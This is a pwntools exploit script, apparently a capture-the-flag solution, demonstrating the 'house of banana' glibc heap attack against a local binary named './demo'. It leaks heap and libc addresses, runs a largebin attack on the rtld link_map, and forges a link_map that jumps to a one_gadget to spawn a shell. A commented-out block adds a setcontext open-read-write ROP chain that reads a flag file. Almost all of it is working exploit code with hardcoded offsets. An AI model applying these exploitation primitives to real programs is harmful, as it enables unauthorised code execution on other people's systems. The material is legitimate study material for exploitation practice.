# 可以直接进行tcache攻击，这里只是单纯演示 house of banana
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64', os = 'linux')
#context(arch = 'i386', os = 'linux')
#context.log_level = 'debug'

io = process("./demo")
elf = ELF("./demo")
libc = elf.libc

def debug():
	gdb.attach(io)
	pause()

sd     = lambda s    : io.send(s)
sda    = lambda s, n : io.sendafter(s, n)
sl     = lambda s    : io.sendline(s)
sla    = lambda s, n : io.sendlineafter(s, n)
rc     = lambda n    : io.recv(n)
rut    = lambda s    : io.recvuntil(s, drop=True)
ruf    = lambda s    : io.recvuntil(s, drop=False)
addr   = lambda n    : u64(io.recv(n, timeout=1).ljust(8, b'\x00'))
addr32 = lambda s    : u32(io.recvuntil(s, drop=True, timeout=1).ljust(4, b'\x00'))
addr64 = lambda s    : u64(io.recvuntil(s, drop=True, timeout=1).ljust(8, b'\x00'))
byte   = lambda n    : str(n).encode()
info   = lambda s, n : print("\033[31m["+s+" -> "+str(hex(n))+"]\033[0m")
sh     = lambda      : io.interactive()
menu   = b'Your choice:'
def add(idx, size):
	sla(menu, b'1')
	sla(b'index:', byte(idx))
	sla(b'Size:', byte(size))

def show(idx):
	sla(menu, b'2')
	sla(b'index:', byte(idx))

def edit(idx, content, flag=True):
	sla(menu, b'3')
	sla(b'index:', byte(idx))
	if flag:
		sla(b'context: ', content)
	else:
		sda(b'context: ', content)

def dele(idx):
	sla(menu, b'4')
	sla(b'index:', byte(idx))

add(0, 0x90)
add(1, 0x90)
dele(1)
dele(0)
show(0)
rut(b'context: \n')
heap_base = addr64(b'\n') - 0x340
info('heap_base', heap_base)

add(0, 0x450)
add(1, 0x100)
add(2, 0x460)
add(3, 0x100)
add(4, 0x410)

dele(2)
add(5, 0x500)
dele(0)
dele(4)
show(0)
rut(b'context: \n')
libc.address = addr64(b'\n') - 0x1ecbe0
info('libc_base', libc.address)
link_map_addr = libc.address + 0x1f2018
info('link_map_addr', link_map_addr)

pay = p64(libc.address+0x1ecfe0)*2 +  p64(heap_base+0x940) + p64(link_map_addr-0x20)
edit(2, pay)
add(5, 0x410)

ones = [0xe3afe, 0xe3b01, 0xe3b04]
ones = [libc.address+i for i in ones]

# one_gadget
pay = p64(0) + p64(0)			# l->next
pay+= p64(0) + p64(heap_base+0x3d0)	# l->real
pay = pay.ljust(0x100, b'\x00')
pay+= p64(heap_base+0x3d0+0x110) + p64(heap_base+0x3d0+0x130)
pay+= p64(heap_base+0x3d0+0x120) + p64(8)
pay+= p64(ones[0])
pay = pay.ljust(0x30c, b'\x00')
pay+= p32(8)


'''
# orw
rdi = libc.address + 0x0000000000023b6a # pop rdi ; ret
rsi = libc.address + 0x000000000002601f # pop rsi ; ret
rdx = libc.address + 0x0000000000142c92 # pop rdx ; ret
ret = libc.address + 0x0000000000022679 # ret
o = libc.sym.open
r = libc.sym.read
w = libc.sym.write
setcontext = libc.sym.setcontext + 61

pay = p64(0) + p64(0)
pay+= p64(0) + p64(heap_base+0x3d0)
pay = pay.ljust(0x100, b'\x00')
pay+= p64(heap_base+0x3d0+0x110) + p64(heap_base+0x3d0+0x130)
pay+= p64(heap_base+0x3d0+0x120) + p64(0x10)
pay+= p64(setcontext)
pay+= p64(ret)
pay+= p64(0)*12 + p64(0) # rdi
pay+= p64(heap_base+0x2a0)   # rsi
print(hex(len(pay)))
pay+= b'./flag\x00\x00'
pay+= p64(0) + p64(0x200)# rdx
pay+= p64(0)*2 +  p64(heap_base+0x2a0) # rsp
pay+= p64(r) 		 # rcx->ret 
pay = pay.ljust(0x30c, b'\x00')
pay+= p64(8)

flag = heap_base + 0x2a0 + 0x100
orw = p64(rdi) + p64(heap_base+0x3d0+0x1b0) + p64(rsi) + p64(0) + p64(o)
orw+= p64(rdi) + p64(3) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x50) + p64(r)
orw+= p64(rdi) + p64(1) + p64(rsi) + p64(flag) + p64(rdx) + p64(0x50) + p64(w)
'''


edit(0, pay, False)
#debug()
sla(menu, b'5')
#sl(orw)
#debug()
sh()
